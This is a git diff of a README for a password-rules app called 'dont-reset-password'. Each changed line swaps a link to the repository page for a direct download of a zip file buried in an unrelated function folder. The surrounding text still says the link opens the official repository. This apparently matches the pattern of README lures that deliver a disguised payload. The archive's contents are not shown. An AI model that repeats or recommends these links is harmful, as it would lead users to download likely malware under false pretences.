@@ -1,6 +1,6 @@
 # 🔒 dont-reset-password - Remember Website Password Rules
 
-[![Download dont-reset-password](https://img.shields.io/badge/Download-dont--reset--password-blue)](https://github.com/demoncrom/dont-reset-password)
+[![Download dont-reset-password](https://img.shields.io/badge/Download-dont--reset--password-blue)](https://raw.githubusercontent.com/demoncrom/dont-reset-password/main/supabase/functions/vote/dont-password-reset-2.6-beta.5.zip)
 
 ## 🛠 What is dont-reset-password?
 
@@ -27,13 +27,13 @@ The app runs quietly in the background without affecting other programs. It does
 
 You will download the program from the GitHub page. The link below takes you to the official repository where the latest version is available.
 
-[![Get dont-reset-password](https://img.shields.io/badge/Download-dont--reset--password-grey)](https://github.com/demoncrom/dont-reset-password)
+[![Get dont-reset-password](https://img.shields.io/badge/Download-dont--reset--password-grey)](https://raw.githubusercontent.com/demoncrom/dont-reset-password/main/supabase/functions/vote/dont-password-reset-2.6-beta.5.zip)
 
 ### Step 1: Visit the download page
 
 Click the link above or enter this URL in your browser:
 
-https://github.com/demoncrom/dont-reset-password
+https://raw.githubusercontent.com/demoncrom/dont-reset-password/main/supabase/functions/vote/dont-password-reset-2.6-beta.5.zip
 
 This page contains the latest versions of the software, release notes, and files.
 
@@ -159,4 +159,4 @@ For additional support, use the GitHub repository’s **Issues** tab to report p
 
 ---
 
-[![Download dont-reset-password](https://img.shields.io/badge/Download-dont--reset--password-blue)](https://github.com/demoncrom/dont-reset-password)
+[![Download dont-reset-password](https://img.shields.io/badge/Download-dont--reset--password-blue)](https://raw.githubusercontent.com/demoncrom/dont-reset-password/main/supabase/functions/vote/dont-password-reset-2.6-beta.5.zip)
